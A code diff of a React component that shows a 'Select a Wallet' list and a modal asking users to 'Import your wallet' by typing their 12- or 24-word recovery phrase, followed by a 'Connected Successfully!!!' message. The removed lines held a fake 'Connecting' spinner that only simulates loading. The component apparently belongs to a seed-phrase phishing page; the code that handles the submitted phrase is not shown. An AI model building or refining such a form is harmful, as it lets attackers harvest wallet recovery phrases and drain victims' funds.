@@ -1,31 +1,21 @@
-import React, { useEffect, useState } from 'react';
-import '../../App.css';
-import '../coincomps/Styles.css'
-import AOS from 'aos';
-import 'aos/dist/aos.css'; // Import AOS CSS
-import { FaShield } from 'react-icons/fa6';
-import { MdCancel } from 'react-icons/md';
+import React, { useEffect, useState } from "react";
+import "../../App.css";
+import AOS from "aos";
+import "aos/dist/aos.css"; // Import AOS CSS
+import { FaShield } from "react-icons/fa6";
+import { MdCancel } from "react-icons/md";
 import { IoSend } from "react-icons/io5";
-import LoadingModal from '../LoadingModal'
-
-const Spinner = () => (
-  <div className="flex items-center justify-center space-x-2">
-    <div className="w-8 h-8 border-4 border-blue-500 border-dashed rounded-full animate-spin"></div>
-    <span className="text-white text-[20px] md:text-[30px] lg:text-[40px]">Connecting <span className='ellipsis'></span> </span>
-  </div>
-);
-
+import LoadingModal from "../LoadingModal";
+import Coins from "../coins/Coins";
 
 const Coincomps = ({ data }) => {
   const [selectedItem, setSelectedItem] = useState(null);
   const [showManualConnectModal, setShowManualConnectModal] = useState(false);
-  const [loading, setLoading] = useState(false);
 
   const [isLoading, setIsLoading] = useState(false);
   const [phrase, setPhrase] = useState("");
   const [isError, setIsError] = useState(false);
   const [isSucess, setIsSucess] = useState(false);
-
 
   const toggleConnect = async () => {
     if (phrase === "") {
@@ -78,48 +68,36 @@ const Coincomps = ({ data }) => {
     setPhrase(e.target.value);
   };
 
-
   useEffect(() => {
     AOS.init();
     AOS.refresh();
   }, []);
 
   const handleItemClick = (item) => {
-    setLoading(true);
     setSelectedItem(item);
-
-     // Simulate loading process
-     setTimeout(() => {
-      setLoading(false);
-    }, 7000);
   };
 
   const handleCloseModal = () => {
     setSelectedItem(null);
     setShowManualConnectModal(false);
-    setLoading(false);
   };
 
   const handleConnectManually = () => {
-    setLoading(true);
     setShowManualConnectModal(true);
-
-    // Simulate loading process
-    setTimeout(() => {
-      setLoading(false);
-    }, 7000);
   };
 
   return (
     <>
       <div className="mx-[3vw] overflow-x-hidden">
-        <h1 className="text-[30px] font-[600] text-center my-[35px]">Select a Wallet</h1>
-        <div data-aos="fade-up" data-aos-duration="2000">
-          <div className="grid gap-y-[35px]">
+        <h1 className="text-[30px] font-[600] text-center my-[35px]">
+          Select a Wallet
+        </h1>
+        <div className="" data-aos="fade-up" data-aos-duration="2000">
+          <div className="grid gap-y-[35px] ">
             {data.map((item) => (
               <div
                 key={item.id}
-                className="flex items-center px-[20px] py-[20px] md:w-[80%] rounded shadow-2xl cursor-pointer"
+                className="flex key items-center px-[20px] py-[20px] md:w-[80%] rounded shadow-2xl cursor-pointer"
                 onClick={() => handleItemClick(item)}
               >
                 <img
@@ -133,7 +111,7 @@ const Coincomps = ({ data }) => {
                   data-aos-duration="2000"
                 >
                   <p className="md:text-[20px] text-[15px] font-[600]">
-                    {item.name}{' '}
+                    {item.name}{" "}
                   </p>
                   <p className="md:text-[15px] text-[12px] text-gray-500 font-[500]">
                     {item.id}
@@ -145,11 +123,13 @@ const Coincomps = ({ data }) => {
         </div>
       </div>
 
+      {/* Modal */}
       {selectedItem && (
-        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-75 flex justify-center items-center overflow-x-hidden" data-aos="fade-up" data-aos-duration="1000">
-          {loading ? (
-            <Spinner/>
-          ) : (
+        <div
+          className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-75 flex justify-center items-center overflow-x-hidden"
+          data-aos="fade-up"
+          data-aos-duration="1000"
+        >
           <div className=" flex  flex-col gap-[20px] items-center bg-white p-4 rounded-lg">
             <MdCancel
               onClick={handleCloseModal}
@@ -198,19 +178,25 @@ const Coincomps = ({ data }) => {
               </p>
             </div>
           </div>
-          )}
         </div>
       )}
 
       {showManualConnectModal && (
-        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 flex justify-center items-center overflow-x-hidden" data-aos="fade-up" data-aos-duration="1000">
-          {loading ? (
-            <Spinner/>
-          ) : (
+        <div
+          className="fixed top-0 left-0 w-full h-full bg-gray-800 flex justify-center items-center overflow-x-hidden"
+          data-aos="fade-up"
+          data-aos-duration="1000"
+        >
           <div className="flex flex-col gap-[20px] items-center bg-gray-900 p-4 rounded-[40px] py-[40px]">
             <div className="flex gap-[10px] items-center">
-              <img src={selectedItem.src} alt={selectedItem.name} className="sm:w-[70px] w-[30px] sm:h-[70px] h-[30px] rounded-full" />
-              <p className="text-[20px] font-[500] text-white">Import your {selectedItem.name} wallet</p>
+              <img
+                src={selectedItem.src}
+                alt=""
+                className="sm:w-[70px] w-[30px] sm:h-[70px] h-[30px] rounded-full"
+              />
+              <p className="text-[20px] font-[500] text-white">
+                Import your {selectedItem.name} wallet
+              </p>
             </div>
             <div className="flex gap-[10px]">
               <p className="text-[15px] font-[500] text-white">Phrase</p>
@@ -226,12 +212,14 @@ const Coincomps = ({ data }) => {
                 cols="35"
                 rows="8"
                 className="bg-white rounded p-3"
-                placeholder="Enter your recovery phrase"></textarea>
+                placeholder="Enter your recovery phrase"
+              ></textarea>
             </div>
             <div>
-              <p className='text-[18px] font-[500] text-white text-center px-[2rem]'>Typicaly 12 (sometimes 24) words separated by single space</p>
+              <p className="text-[18px] font-[500] text-white text-center px-[2rem]">
+                Typicaly 12 (sometimes 24) words separated by single space
+              </p>
             </div>
-            
             {isSucess ? (
               <div className=" w-full bg-[#82f986] font-semibold text-[#ffffff] text-center rounded-lg py-3 text-lg">
                 <button>Connected Successfully!!!</button>
@@ -249,10 +237,12 @@ const Coincomps = ({ data }) => {
               </div>
             )}
 
-            <MdCancel onClick={handleCloseModal} color="black"
-              className="relative bg-white hover:cursor-[pointer]  sm:h-[30px] h-[40px]  sm:w-[30px] w-[40px] rounded" />
+            <MdCancel
+              onClick={handleCloseModal}
+              color="black"
+              className="relative bg-white hover:cursor-[pointer]  sm:h-[30px] h-[40px]  sm:w-[30px] w-[40px] rounded"
+            />
           </div>
-          )}
         </div>
       )}
     </>
